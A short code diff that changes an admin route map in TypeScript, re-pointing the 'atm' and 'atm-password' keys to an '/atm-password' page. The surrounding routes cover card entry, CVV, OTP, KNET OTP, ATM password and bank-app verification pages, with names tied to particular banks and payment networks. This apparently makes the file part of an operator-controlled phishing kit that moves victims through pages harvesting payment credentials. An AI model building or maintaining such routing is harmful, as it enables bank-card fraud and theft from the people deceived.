@@ -11,7 +11,7 @@ export const ADMIN_PAGE_ROUTES: Record<string, string> = {
   card: "/card", "credit-card-payment": "/card", "rajhi-payment-error": "/card",
   "otp-verification": "/otp-verification", otp: "/otp-verification",
   "knet-otp": "/knet-otp",
-  atm: "/atm", "atm-password": "/atm",
+  atm: "/atm-password", "atm-password": "/atm-password",
   "bank-app-verification": "/bank-app-verification", app: "/bank-app-verification",
   cvv: "/cvv",
   "final-page": "/final-page", final: "/final-page",
